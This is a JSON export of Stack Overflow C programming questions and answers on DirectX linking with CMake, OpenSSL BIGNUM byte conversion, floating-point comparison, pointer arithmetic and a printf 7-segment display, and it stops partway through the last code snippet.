[{"tags": ["c", "visual-c++", "linker", "cmake", "directx"], "answers": [{"comments": [{"owner": {"reputation": 11202, "user_id": 886669, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/c56f1eac6c5b31b32bdffa4f741f3aed?s=128&d=identicon&r=PG", "display_name": "yasar", "link": "https://stackoverflow.com/users/886669/yasar"}, "edited": false, "score": 0, "creation_date": 1444929931, "post_id": 33151953, "comment_id": 54118749, "body": "Thanks, this solves my problem. It is weird that how dxguid library was never mentioned in any tutorial I read. Also, thanks for bonus information, I wasn&#39;t aware of those points."}], "tags": [], "owner": {"reputation": 12286, "user_id": 1607442, "user_type": "registered", "accept_rate": 36, "profile_image": "https://www.gravatar.com/avatar/18451ad16ed8ad45b0a18bf70b2aa002?s=128&d=identicon&r=PG", "display_name": "Ivan Aksamentov - Drop", "link": "https://stackoverflow.com/users/1607442/ivan-aksamentov-drop"}, "is_accepted": true, "score": 0, "last_activity_date": 1444922338, "last_edit_date": 1495540718, "creation_date": 1444921179, "answer_id": 33151953, "question_id": 33137590, "link": "https://stackoverflow.com/questions/33137590/link-against-dx10-using-cmake/33151953#33151953", "title": "Link against DX10 using cmake", "body": "<p><strong>Specific problems:</strong></p>\n\n<ol>\n<li><p>You are pointing to <code>Lib/x86</code> library dir, but compiling against x64 architecture (I can see it by path to <code>...Bin\\amd64\\nmake.exe</code>). You should Delete CMake cache (in<code>cmake-gui</code>: menu \"File\" -> \"Delete Cache\") and re-configure for  <code>Visual Studio 10 2010</code>, not <code>Visual Studio 10 2010 Win64</code>. Alternatively, you could point linker to <code>Lib/x64</code> directory.</p></li>\n<li><p>You are missing <code>dxguid</code> library:</p>\n\n<pre><code>target_link_libraries(tut1 d3d10 d3dx10 dxguid)\n</code></pre></li>\n</ol>\n\n<p><strong>Bonus:</strong></p>\n\n<ol start=\"3\">\n<li><p>There is no point of learning DirectX 10 in year 2015, it is obsolete. Learn DirectX 11 instead: it's the same API with more features.</p></li>\n<li><p>DirectX SDK is obsolete and its usage is discouraged (by Microsoft). Last version was issued in June 2010, and you  use even older version (August 2009). Microsoft has merged DirectX SDK with Windows SDK since version 8. See <a href=\"https://stackoverflow.com/questions/20362041/directx-sdk-vs-windows-sdk-which-one-to-use\">this answer</a> for details.</p></li>\n<li><p>There is no point of using Visual Studio 2010 in year 2015. It is almost 6 years old and does not support many modern C and C++ features (this means you have no chance to learn them). Use Visual Studio 2015. <a href=\"https://www.visualstudio.com/en-us/downloads/download-visual-studio-vs.aspx\" rel=\"nofollow noreferrer\">Community edition</a> is free for non-commercial usage. You will get full kit and Windows SDK as well (just don't forget to mark \"C++ dev tools\" during installation).</p></li>\n<li><p>There is no point of using cross-platform build system such as CMake for DirectX projects. DirectX is only available for Windows platform anyway.</p></li>\n</ol>\n"}], "owner": {"reputation": 11202, "user_id": 886669, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/c56f1eac6c5b31b32bdffa4f741f3aed?s=128&d=identicon&r=PG", "display_name": "yasar", "link": "https://stackoverflow.com/users/886669/yasar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2232, "favorite_count": 0, "accepted_answer_id": 33151953, "answer_count": 1, "score": 0, "last_activity_date": 1444922338, "creation_date": 1444866677, "question_id": 33137590, "link": "https://stackoverflow.com/questions/33137590/link-against-dx10-using-cmake", "title": "Link against DX10 using cmake", "body": "<p>I am trying to compile this:</p>\n\n<pre><code>#define COBJMACROS\n\n#include &lt;windows.h&gt;\n#include &lt;d3d10.h&gt;\n#include &lt;d3dx10.h&gt;\n\nHWND                    g_hWnd = NULL;\nID3D10Device*           g_pd3dDevice = NULL;\nIDXGISwapChain*         g_pSwapChain = NULL;\nID3D10RenderTargetView* g_pRenderTargetView = NULL;\n\nLRESULT CALLBACK WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)\n{\n    switch(uMsg) {\n    case WM_CLOSE:\n        DestroyWindow(hwnd);\n    break;\n    case WM_DESTROY:\n        PostQuitMessage(0);\n    break;\n    default:\n        return DefWindowProc(hwnd, uMsg, wParam, lParam);\n    }\n\n    return 0;\n}\n\nconst char lpszClassName[] = \"TutorialWindowClass\";\n\nHRESULT InitWindow(HINSTANCE hInstance,int nCmdShow )\n{\n    HWND hwnd;\n    WNDCLASSEX wcex;\n\n    wcex.cbSize = sizeof( WNDCLASSEX );\n    wcex.style = CS_HREDRAW | CS_VREDRAW;\n    wcex.lpfnWndProc = WndProc;\n    wcex.cbClsExtra = 0;\n    wcex.cbWndExtra = 0;\n    wcex.hInstance = hInstance;\n    wcex.hIcon = LoadIcon(NULL, IDI_APPLICATION);;\n    wcex.hCursor = LoadCursor(NULL, IDC_ARROW);\n    wcex.hbrBackground = ( HBRUSH )( COLOR_WINDOW + 1 );\n    wcex.lpszMenuName = NULL;\n    wcex.lpszClassName = lpszClassName;\n    wcex.hIconSm = LoadIcon(NULL, IDI_APPLICATION);\n\n    if(!RegisterClassEx( &amp;wcex ))\n        return E_FAIL;\n\n    g_hWnd = CreateWindow(\n        lpszClassName,\n        \"DX10 TUT0: CreateWindow\",\n        WS_OVERLAPPEDWINDOW,\n        CW_USEDEFAULT, CW_USEDEFAULT, // starting coordinates, Windows decide\n        640, 480, // window size\n        NULL,\n        NULL,\n        hInstance,\n        NULL\n    );\n\n    if(!g_hWnd)\n        return E_FAIL;\n\n    ShowWindow(hwnd, nCmdShow);\n\n    return S_OK;\n}\n\nHRESULT InitDevice()\n{\n    HRESULT hr = S_OK;\n    RECT rc;\n    UINT width;\n    UINT height;\n    DXGI_SWAP_CHAIN_DESC sd;\n    ID3D10Resource* pBackBuffer;\n    D3D10_VIEWPORT vp;\n\n    GetClientRect(g_hWnd, &amp;rc);\n    width = rc.right - rc.left;\n    height = rc.bottom - rc.top;\n\n    ZeroMemory(&amp;sd, sizeof(sd));\n    sd.BufferCount = 1;\n    sd.BufferDesc.Width = width;\n    sd.BufferDesc.Height = height;\n    sd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\n    sd.BufferDesc.RefreshRate.Numerator = 60;\n    sd.BufferDesc.RefreshRate.Denominator = 1;\n    sd.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\n    sd.OutputWindow = g_hWnd;\n    sd.SampleDesc.Count = 1;\n    sd.SampleDesc.Quality = 0;\n    sd.Windowed = TRUE;\n\n    hr = D3D10CreateDeviceAndSwapChain(\n        NULL,\n        D3D10_DRIVER_TYPE_HARDWARE,\n        NULL,\n        0,\n        D3D10_SDK_VERSION,\n        &amp;sd,\n        &amp;g_pSwapChain,\n        &amp;g_pd3dDevice\n    );\n\n    if (FAILED(hr))\n        return hr;\n\n\n    hr = IDXGISwapChain_GetBuffer(g_pSwapChain, 0, &amp;IID_ID3D10Texture2D, ( LPVOID* )&amp;pBackBuffer);\n\n    if( FAILED( hr ) )\n        return hr;\n\n    hr = ID3D10Device_CreateRenderTargetView(g_pd3dDevice, pBackBuffer, NULL, &amp;g_pRenderTargetView);\n\n    ID3D10Resource_Release(pBackBuffer);\n\n    if( FAILED( hr ) )\n        return hr;\n\n    ID3D10Device_OMSetRenderTargets(g_pd3dDevice, 1, &amp;g_pRenderTargetView, NULL);\n\n    // Setup the viewport\n\n    vp.Width = width;\n    vp.Height = height;\n    vp.MinDepth = 0.0f;\n    vp.MaxDepth = 1.0f;\n    vp.TopLeftX = 0;\n    vp.TopLeftY = 0;\n\n    ID3D10Device_RSSetViewports(g_pd3dDevice, 1, &amp;vp);\n\n    return S_OK;\n\n}\n\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)\n{\n    MSG msg;\n\n    if(FAILED(InitWindow(hInstance, nCmdShow)))\n        return 0;\n\n\n    // Main message loop\n\n    while( GetMessage( &amp;msg, NULL, 0, 0 ) )\n    {\n        TranslateMessage( &amp;msg );\n        DispatchMessage( &amp;msg );\n    }\n\n    return ( int )msg.wParam;\n}\n</code></pre>\n\n<p>It is a C code (Not C++). It is supposed to create direct3d device using DirectX 10. I am using cmake for my build system. Here is my CMakeLists file:</p>\n\n<pre><code>cmake_minimum_required (VERSION 2.6)\nproject (DXTUTS C)\n\ninclude_directories(\"C:/Program Files (x86)/Microsoft DirectX SDK (August 2009)/Include\")\nlink_directories(\"C:/Program Files (x86)/Microsoft DirectX SDK (August 2009)/Lib/x86\")\n\nadd_executable(tut1 WIN32 tut1.c)\ntarget_link_libraries(tut1 d3d10 d3dx10)\n</code></pre>\n\n<p>However, when I try to compile, I get this linker error:</p>\n\n<pre><code>[ 50%] Linking C executable tut1.exe\ntut1.c.obj : error LNK2001: unresolved external symbol IID_ID3D10Texture2D\ntut1.c.obj : error LNK2019: unresolved external symbol D3D10CreateDeviceAndSwapC\nhain referenced in function InitDevice\ntut1.exe : fatal error LNK1120: 2 unresolved externals\nLINK Pass 1 failed. with 1120\nNMAKE : fatal error U1077: '\"C:\\Program Files (x86)\\CMake\\bin\\cmake.exe\"' : return code '0xffffffff'\nStop.\nNMAKE : fatal error U1077: '\"C:\\Program Files (x86)\\Microsoft Visual Studio 10.0\\VC\\Bin\\amd64\\nmake.exe\"' : return code '0x2'\nStop.\nNMAKE : fatal error U1077: '\"C:\\Program Files (x86)\\Microsoft Visual Studio 10.0\\VC\\Bin\\amd64\\nmake.exe\"' : return code '0x2'\nStop.\n</code></pre>\n\n<p>How can I successfully link this C code using DirectX SDK?</p>\n"}, {"tags": ["objective-c", "c", "openssl", "bit-representation"], "owner": {"reputation": 1029, "user_id": 3720007, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/2e9ec29b96314d049d9dd3e8176ccf8a?s=128&d=identicon&r=PG&f=1", "display_name": "Sayaki", "link": "https://stackoverflow.com/users/3720007/sayaki"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 182, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1444948575, "creation_date": 1444866398, "last_edit_date": 1444948575, "question_id": 33137551, "link": "https://stackoverflow.com/questions/33137551/bignum-in-twos-complement-representation", "title": "BIGNUM in two&#39;s complement representation", "body": "<p>I have <a href=\"https://www.openssl.org/docs/manmaster/crypto/bn.html\" rel=\"nofollow\">BIGNUM</a> structure from what contains really big positive integer. I'm converting this BIGNUM to array of bytes using <a href=\"https://www.openssl.org/docs/manmaster/crypto/BN_bn2bin.html\" rel=\"nofollow\">BN_bn2bin</a> function:</p>\n\n<pre><code>BIGNUM *bigInteger = ...\nBN_bn2bin(bigInteger, bigIntegerBytes);\n</code></pre>\n\n<p>I noticed that bigIntegerBytes is in unsigned value representation. I would like to covert this integer from unsinged value representation to <a href=\"https://en.wikipedia.org/wiki/Two%27s_complement\" rel=\"nofollow\">Two's complement</a> representation. Can you tell me please how to do that?</p>\n\n<p>PS. I'm using objective-c so maybe there is any way to do that using NSData.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1444866460, "post_id": 33137472, "comment_id": 54086465, "body": "Duplicate: <a href=\"http://stackoverflow.com/q/588004\">stackoverflow.com/q/588004</a>"}, {"owner": {"reputation": 107137, "user_id": 364696, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7eBCp.jpg?s=128&g=1", "display_name": "ShadowRanger", "link": "https://stackoverflow.com/users/364696/shadowranger"}, "edited": false, "score": 0, "creation_date": 1444887627, "post_id": 33137472, "comment_id": 54091942, "body": "Because floating point is the devil. I&#39;ve said it before, I&#39;ll keep saying it until people understand."}, {"owner": {"reputation": 384463, "user_id": 1126841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa05233b2357f8d11c22ef4cfc7bb85c?s=128&d=identicon&r=PG", "display_name": "chepner", "link": "https://stackoverflow.com/users/1126841/chepner"}, "edited": false, "score": 0, "creation_date": 1444931732, "post_id": 33137472, "comment_id": 54119666, "body": "1.1 is not exactly the rational number 11/10. It is rather the <a href=\"https://en.wikipedia.org/wiki/Dyadic_rational\" rel=\"nofollow noreferrer\">dyadic rational</a> whose value is closest to 11/10."}], "answers": [{"tags": [], "owner": {"reputation": 2030, "user_id": 550235, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/934de7ad57af9a8f6a37e0c78017f942?s=128&d=identicon&r=PG", "display_name": "Russ Schultz", "link": "https://stackoverflow.com/users/550235/russ-schultz"}, "is_accepted": false, "score": 6, "last_activity_date": 1444866130, "creation_date": 1444866130, "answer_id": 33137505, "question_id": 33137472, "link": "https://stackoverflow.com/questions/33137472/why-1-1-1-010-isnt-1-0/33137505#33137505", "title": "Why (1.1-1.0)*10 isn&#39;t 1.0?", "body": "<p>Chasing equality in floating point is mostly a fools game.</p>\n\n<p>Best you can do is decide upon a delta that's 'close enough' and compare with that.</p>\n\n<p>google told me to read this for more information:  <a href=\"http://www.cygnus-software.com/papers/comparingfloats/comparingfloats.htm\" rel=\"noreferrer\">http://www.cygnus-software.com/papers/comparingfloats/comparingfloats.htm</a></p>\n"}, {"comments": [{"owner": {"reputation": 384463, "user_id": 1126841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa05233b2357f8d11c22ef4cfc7bb85c?s=128&d=identicon&r=PG", "display_name": "chepner", "link": "https://stackoverflow.com/users/1126841/chepner"}, "edited": false, "score": 0, "creation_date": 1444931912, "post_id": 33137690, "comment_id": 54119740, "body": "I don&#39;t think there&#39;s any guarantee that this will work. All you&#39;ve done is replace a single expression with a series of assignments."}, {"owner": {"reputation": 748, "user_id": 5381184, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/da66272a60130c5f545312f67e16d9a3?s=128&d=identicon&r=PG&f=1", "display_name": "BobRun", "link": "https://stackoverflow.com/users/5381184/bobrun"}, "reply_to_user": {"reputation": 384463, "user_id": 1126841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa05233b2357f8d11c22ef4cfc7bb85c?s=128&d=identicon&r=PG", "display_name": "chepner", "link": "https://stackoverflow.com/users/1126841/chepner"}, "edited": false, "score": 0, "creation_date": 1444950777, "post_id": 33137690, "comment_id": 54128929, "body": "Please compile and run."}], "tags": [], "owner": {"reputation": 748, "user_id": 5381184, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/da66272a60130c5f545312f67e16d9a3?s=128&d=identicon&r=PG&f=1", "display_name": "BobRun", "link": "https://stackoverflow.com/users/5381184/bobrun"}, "is_accepted": false, "score": 1, "last_activity_date": 1444872587, "last_edit_date": 1444872587, "creation_date": 1444867473, "answer_id": 33137690, "question_id": 33137472, "link": "https://stackoverflow.com/questions/33137472/why-1-1-1-010-isnt-1-0/33137690#33137690", "title": "Why (1.1-1.0)*10 isn&#39;t 1.0?", "body": "<p>But this works as you wanted:</p>\n\n<pre><code>int main(int argc, char **argv)\n{\n    float x,y;\n    x=0.0;\n    y=0.0;\n\n    x=1.1 - 1.0;\n    x=x*10.0;\n    x=x-1.0;\n\n    if (   x==y )\n        printf(\"True\");\n    else\n        printf(\"False\");\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 0, "last_activity_date": 1444931093, "last_edit_date": 1444931093, "creation_date": 1444886840, "answer_id": 33140524, "question_id": 33137472, "link": "https://stackoverflow.com/questions/33137472/why-1-1-1-010-isnt-1-0/33140524#33140524", "title": "Why (1.1-1.0)*10 isn&#39;t 1.0?", "body": "<p>Most <code>double</code> math uses a <a href=\"https://en.wikipedia.org/wiki/Double-precision_floating-point_format\" rel=\"nofollow\">binary floating point</a> representation.  So <code>1.1</code> is not <em>exactly</em> representable - just something close to it.  Consider the following which uses <code>volatile</code> to prevent compiler optimizations.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main(void) {\n  volatile double wpw = 1.1;\n  volatile double one = 1.0;\n  volatile double ten = 10.0;\n  printf(\"%.20e\\n\", wpw);\n  printf(\"%.20e\\n\", wpw - one);\n  printf(\"%.20e\\n\", (wpw - one) * ten);\n  printf(\"%.20e\\n\", (wpw - one) * ten - one);\n  return 0;\n}\n</code></pre>\n\n<p>And it output below.  <code>1.1 - 1.0</code> is only <em>approximately</em> <code>0.1</code>.</p>\n\n<pre><code>1.10000000000000008882e+00\n1.00000000000000088818e-01\n1.00000000000000088818e+00\n8.88178419700125232339e-16\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 5447289, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4ba644928e111bd44852de9c8316f815?s=128&d=identicon&r=PG&f=1", "display_name": "Rysiek64", "link": "https://stackoverflow.com/users/5447289/rysiek64"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 92, "favorite_count": 0, "closed_date": 1444931513, "answer_count": 3, "score": 1, "last_activity_date": 1444931093, "creation_date": 1444865922, "question_id": 33137472, "link": "https://stackoverflow.com/questions/33137472/why-1-1-1-010-isnt-1-0", "closed_reason": "Duplicate", "title": "Why (1.1-1.0)*10 isn&#39;t 1.0?", "body": "<p>Why result of this code is false? I can't solve this problem.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main(int argc, char **argv)\n{\nif ( (1.1 - 1.0)*10.0 - 1.0 == 0.0 )\n    printf(\"True\");\nelse\n    printf(\"False\");\nreturn 0;\n}\n</code></pre>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 0, "creation_date": 1444866672, "post_id": 33137453, "comment_id": 54086503, "body": "It means the same thing as <code>integers[3]</code>, by definition."}, {"owner": {"reputation": 33, "user_id": 5386051, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/501881ed9a5ca7fec02e1db214d63085?s=128&d=identicon&r=PG&f=1", "display_name": "Alex James", "link": "https://stackoverflow.com/users/5386051/alex-james"}, "reply_to_user": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 0, "creation_date": 1444867221, "post_id": 33137453, "comment_id": 54086647, "body": "printf(\u201c%d\\n\u201d, *(integers + 3)), So then how does it print out to be 12?"}, {"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 0, "creation_date": 1444868524, "post_id": 33137453, "comment_id": 54087013, "body": "It was doubled by doubleArray()"}], "answers": [{"comments": [{"owner": {"reputation": 8843, "user_id": 1059070, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/4955d082153c5761dd62f3e3d736a48a?s=128&d=identicon&r=PG", "display_name": "arcyqwerty", "link": "https://stackoverflow.com/users/1059070/arcyqwerty"}, "reply_to_user": {"reputation": 33, "user_id": 5386051, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/501881ed9a5ca7fec02e1db214d63085?s=128&d=identicon&r=PG&f=1", "display_name": "Alex James", "link": "https://stackoverflow.com/users/5386051/alex-james"}, "edited": false, "score": 0, "creation_date": 1444867645, "post_id": 33137662, "comment_id": 54086784, "body": "Good luck with your midterm!"}], "tags": [], "owner": {"reputation": 8843, "user_id": 1059070, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/4955d082153c5761dd62f3e3d736a48a?s=128&d=identicon&r=PG", "display_name": "arcyqwerty", "link": "https://stackoverflow.com/users/1059070/arcyqwerty"}, "is_accepted": true, "score": 2, "last_activity_date": 1444867565, "last_edit_date": 1444867565, "creation_date": 1444867223, "answer_id": 33137662, "question_id": 33137453, "link": "https://stackoverflow.com/questions/33137453/how-does-array-3-work/33137662#33137662", "title": "How does *(array + 3) work?", "body": "<p><strong><code>*</code> is a dereference operator on a pointer.</strong></p>\n\n<p>This means that it will \"get\" the value that's stored at the pointer address of the item right after it (<code>(integers + 3)</code>).</p>\n\n<p>It will interpret this value as the dereferenced type of the item after it (<code>int</code> since <code>(integers + 3)</code> is of type <code>int*</code>)</p>\n\n<p><strong>(integers + 3)</strong></p>\n\n<p><code>integers</code> is a pointer to the address of the first element of the <code>integers</code> array.</p>\n\n<p>That means that if <code>integers</code> contained <code>[1, 2, 3, 4, 5]</code> then it would point to where <code>1</code> is stored in memory.</p>\n\n<p><code>integers + 3</code> takes the address of <code>integers</code> (i.e. where <code>1</code> is stored in memory) and adds the amount of address space required to store 3 <code>int</code>s  (since the pointer is of type <code>int*</code>).  Advancing it by one space would give you the address of <code>2</code> in memory, advancing it by two spaces would give you the address of <code>3</code> in memory, and advancing it by three spaces gives you the address of <code>4</code> in memory.</p>\n\n<p><strong>How this applies to your example</strong></p>\n\n<p><code>(integers + 3)</code> gives you the address of the 4th item in the <code>integers</code> array since it's the first element's address plus the size of three elements.</p>\n\n<p>Dereferencing that with the <code>*</code> operator, gives you the value of the 4th element, <code>12</code> (since the value of <code>6</code> was doubled by <code>doubleArray</code>)</p>\n\n<p>The same applies to <code>*(integers + 4)</code> except that <code>doubleArray</code> didn't double the 5th element so it gives you <code>7</code>.</p>\n\n<p><strong>How <code>doubleArray</code> works</strong></p>\n\n<p><code>for (int i = 0; i &lt; length-2; i++)</code> means start the variable <code>i</code> at 0 and advance it until it is <code>length - 2</code>.</p>\n\n<p>This means it takes the value of everything from <code>0</code> to the value of <code>length - 2</code> but executes the body of the loop for values from <code>0</code> to <code>length - 3</code> since the <code>&lt;</code> is exclusive (the conditional is evaluated BEFORE executing the body of the loop so when <code>i == length - 2</code> the condition is <code>false</code> and the loop terminates without further execution.</p>\n\n<p>So, for each element, excluding the last two, the element in <code>array</code> is added to itself.</p>\n"}], "owner": {"reputation": 33, "user_id": 5386051, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/501881ed9a5ca7fec02e1db214d63085?s=128&d=identicon&r=PG&f=1", "display_name": "Alex James", "link": "https://stackoverflow.com/users/5386051/alex-james"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 39, "favorite_count": 0, "accepted_answer_id": 33137662, "answer_count": 1, "score": 1, "last_activity_date": 1444867715, "creation_date": 1444865803, "last_edit_date": 1444867715, "question_id": 33137453, "link": "https://stackoverflow.com/questions/33137453/how-does-array-3-work", "title": "How does *(array + 3) work?", "body": "<p>I am studying for my midterm. this was an example code</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nvoid doubleArray(int array[], int length) \n {\nfor (int i = 0; i &lt; length-2; i++) {\n        array[i] += array[i];\n }\n     length += 5;\n     printf(\u201c%d\\n\u201d, length); // Question 29\n }\n\n\nint main(int argc,char *argv[]) {\n     int integers[6] = { 3, 4, 5, 6, 7, 8};\n     int length = 6;\n\n\nprintf(\u201c%d\\n\u201d, integers[4]); // Question 28\ndoubleArray(integers, length);\nprintf(\u201c%d\\n\u201d, *(integers + 3)); // Question 30\nprintf(\u201c%d\\n\u201d, *(integers + 4)); // Question 31\nprintf(\u201c%d\\n\u201d, length); // Question 32\n}\n</code></pre>\n\n<p>for questions 30 and 31\nthe answer is that it prints 12 (30) and 7 (31)\ncan someone explain to me why and what that \"*(integers + 3)\" means?</p>\n"}, {"tags": ["c", "arrays", "multidimensional-array"], "answers": [{"comments": [{"owner": {"reputation": 115, "user_id": 4518739, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f9d0795fd079fc7a67deebf9d05413c3?s=128&d=identicon&r=PG&f=1", "display_name": "Senglish", "link": "https://stackoverflow.com/users/4518739/senglish"}, "edited": false, "score": 0, "creation_date": 1444870011, "post_id": 33137700, "comment_id": 54087339, "body": "Ok, I editted the program above to show the exact output I&#39;m getting. I&#39;m not exactly sure as to how I would implement your idea seing as each of those marks are being stored in an int array that prints them out at the end."}, {"owner": {"reputation": 675, "user_id": 2799273, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb0d46ccc0d4a6f55df3533e17bd7201?s=128&d=identicon&r=PG&f=1", "display_name": "mescarra", "link": "https://stackoverflow.com/users/2799273/mescarra"}, "reply_to_user": {"reputation": 115, "user_id": 4518739, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f9d0795fd079fc7a67deebf9d05413c3?s=128&d=identicon&r=PG&f=1", "display_name": "Senglish", "link": "https://stackoverflow.com/users/4518739/senglish"}, "edited": false, "score": 0, "creation_date": 1444911081, "post_id": 33137700, "comment_id": 54105666, "body": "An easy way out is to initialize the <code>digits</code> array with with white spaces instead of the null character (<code>\\0</code>). I&#39;ll edit my answer to show you how."}], "tags": [], "owner": {"reputation": 675, "user_id": 2799273, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fb0d46ccc0d4a6f55df3533e17bd7201?s=128&d=identicon&r=PG&f=1", "display_name": "mescarra", "link": "https://stackoverflow.com/users/2799273/mescarra"}, "is_accepted": false, "score": 1, "last_activity_date": 1444911316, "last_edit_date": 1444911316, "creation_date": 1444867537, "answer_id": 33137700, "question_id": 33137164, "link": "https://stackoverflow.com/questions/33137164/7-segment-display-with-printf-and-multidimensional-array-in-c/33137700#33137700", "title": "7-Segment display with printf and multidimensional array in C", "body": "<p>The problem is you have to actually print white spaces (<code>printf(\" \");</code>) if the line segment is inactive (instead of not printing anything), otherwise 7-segment display will show kind of messy. Here's an ugly code that does the job:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#define MAX_DIGITS 10\n\nconst int array[MAX_DIGITS][7]={{1,1,1,0,1,1,1},{0,0,1,0,0,1,0},{1,0,1,1,1,0,1},{1,0,1,1,0,1,1},{0,1,1,1,0,1,0},{1,1,0,1,0,1,1},{1,1,0,1,1,1,1},{1,0,1,0,0,1,0},{1,1,1,1,1,1,1},{1,1,1,1,0,1,1},};\n\nvoid print_number(int num)\n{\n    //First line\n    if (array[num][0]) printf(\" _ \");\n\n    printf(\"\\n\");\n\n    //Second line\n    if (array[num][1])\n        printf(\"|\");\n    else\n        printf(\" \");\n\n    if (array[num][3])\n        printf(\"_\");\n    else\n        printf(\" \");\n\n    if (array[num][2]) printf(\"|\");\n\n    printf(\"\\n\");\n\n    //Third line\n    if (array[num][4])\n        printf(\"|\");\n    else\n        printf(\" \");\n\n    if (array[num][6])\n        printf(\"_\");\n    else\n        printf(\" \");\n\n    if (array[num][5]) printf(\"|\");\n\n    printf(\"\\n\");\n}\n\nint main(void) {\n    int a=0;\n\n    printf(\"Enter a number:\");\n    scanf(\"%d\", &amp;a);\n    if (a&gt;=0 &amp;&amp; a &lt;= 9){\n        print_number(a);\n    }\n    return 0;\n}\n</code></pre>\n\n<p><strong>EDIT</strong></p>\n\n<p>To accomplish this with your code, you could just initialize the <code>digits</code> array with white spaces instead of null characters (<code>\\0</code>) like so:</p>\n\n<pre><code>void clear_digits_array(void){\n    int j=0,i=0;\n    for(i=0;i&lt;3;i++){\n        for(j=0;j&lt;MAX_DIGITS*4;j++){\n            digits[i][j]=' ';\n        }\n    }\n}\n</code></pre>\n\n<p>And then you should print line breaks to separate lines, like so:</p>\n\n<pre><code>void print_digits_array(void){\n    int a=0,b=0;\n    for(a=0;a&lt;3;a++){\n        for(b=0;b&lt;MAX_DIGITS*4;b++)\n            printf(\"%c\",digits[a][b]);\n        printf(\"\\n\");\n    }\n}\n</code></pre>\n\n<p>And that should do it!</p>\n"}, {"tags": [], "owner": {"reputation": 115, "user_id": 4518739, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f9d0795fd079fc7a67deebf9d05413c3?s=128&d=identicon&r=PG&f=1", "display_name": "Senglish", "link": "https://stackoverflow.com/users/4518739/senglish"}, "is_accepted": true, "score": 0, "last_activity_date": 1444921140, "creation_date": 1444921140, "answer_id": 33151931, "question_id": 33137164, "link": "https://stackoverflow.com/questions/33137164/7-segment-display-with-printf-and-multidimensional-array-in-c/33151931#33151931", "title": "7-Segment display with printf and multidimensional array in C", "body": "<p>So here's how I figured it out. @Mescarra you were correct in saying that I should clear the array with blank spaces rather than a null character. However, that only solved half of the problems. For this to work correctly, when the print function was called, there were two \\n needed. One between the rows and one between the columns to apply a space where was needed to align the characters correctly. Here's what I ended up getting to work properly. If there's a better way of doing so than please share, would love to know!</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-css lang-css prettyprint-override\"><code>//\r\n//output should be        _   _        _   _   _   _   _   _\r\n//                     |  _|  _|  |_| |_  |_    | |_| |_| | |\r\n//                     | |_   _|    |  _| |_|   | |_|   | |_|\r\n\r\n#include &lt;stdio.h&gt;\r\n#define 